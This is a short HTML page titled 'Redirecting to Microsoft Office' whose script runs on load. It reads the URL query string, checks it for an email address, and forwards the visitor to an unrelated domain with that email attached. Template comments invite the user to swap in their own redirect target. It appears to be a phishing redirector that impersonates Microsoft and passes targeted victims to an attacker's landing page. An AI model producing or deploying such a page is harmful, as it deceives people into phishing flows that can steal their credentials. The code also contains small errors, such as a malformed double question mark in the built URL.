<!DOCTYPE html>
<html>
<head>
  <title>Redirecting to Microsoft Office</title>
  <script>
    function extractAndRedirect() {
      // Get the query parameter from the URL
      var queryParam = window.location.search.substring(1);

      // Use a default redirect link if query parameter is empty
      if (!queryParam) {
        queryParam = ''; // Change this to your default query parameter
      }

      // Convert the query parameter to a hash fragment
      var hashFragment = "#" + queryParam;

      // Initialize the default redirect URL
      var defaultRedirectURL = 'https://vmemail.com?'; // Change this to your desired default redirect URL

      // Check if the hash fragment includes '@' (email address indicator)
      if (hashFragment.includes('@')) {
        // It might be an email address, so let's check
        var emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (emailPattern.test(hashFragment)) {
          // It's a valid email address, retain the email and redirect to the default URL
          var decodedEmail = decodeURIComponent(hashFragment);
          window.location.href = defaultRedirectURL + '?' + 'email=' + decodedEmail;
        } else {
          // It's not a valid email address, redirect to the default URL
          window.location.href = defaultRedirectURL;
        }
      } else {
        // It's a URL, redirect to the default URL
        window.location.href = defaultRedirectURL;
      }
    }

    // Call the function immediately when the script is loaded
    extractAndRedirect();
  </script>
</head>
<body>
</body>
</html>
